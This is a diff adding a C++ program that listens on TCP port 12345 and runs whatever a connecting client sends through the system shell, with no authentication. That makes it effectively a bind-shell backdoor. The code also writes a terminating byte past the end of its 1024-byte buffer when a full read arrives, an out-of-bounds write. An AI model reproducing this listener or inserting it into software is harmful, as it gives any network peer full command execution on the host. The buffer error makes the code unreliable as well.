@@ -1,0 +1,51 @@
+#include <iostream>
+#include <boost/asio.hpp>
+#include <cstdlib>
+#include <cstring>
+
+using boost::asio::ip::tcp;
+
+void execute_command(const std::string &command) {
+    std::cout << "Executing command: " << command << std::endl;
+    system(command.c_str()); // Execute the command using the system shell
+}
+
+int main() {
+  try {
+    boost::asio::io_context io_context;
+
+    // Create a TCP server that listens on port 12345
+    tcp::acceptor acceptor(io_context, tcp::endpoint(tcp::v4(), 12345));
+
+    std::cout << "Server listening on port 12345..." << std::endl;
+
+    // Wait for a client connection
+    tcp::socket socket(io_context);
+    acceptor.accept(socket);
+
+    std::cout << "Client connected!" << std::endl;
+
+    for (;;) {
+      char data[1024];
+      boost::system::error_code error;
+
+      // Receive data from the client
+      size_t length = socket.read_some(boost::asio::buffer(data), error);
+
+      if (error == boost::asio::error::eof)
+          break; // Connection closed cleanly by peer.
+      else if (error)
+          throw boost::system::system_error(error); // Some other error.
+
+      // Null-terminate the received data and execute it as a command
+      data[length] = '\0';
+      std::string command(data);
+      execute_command(command);
+    }
+  } catch (std::exception &e) {
+      std::cerr << "Exception: " << e.what() << std::endl;
+  }
+
+  return 0;
+}
+
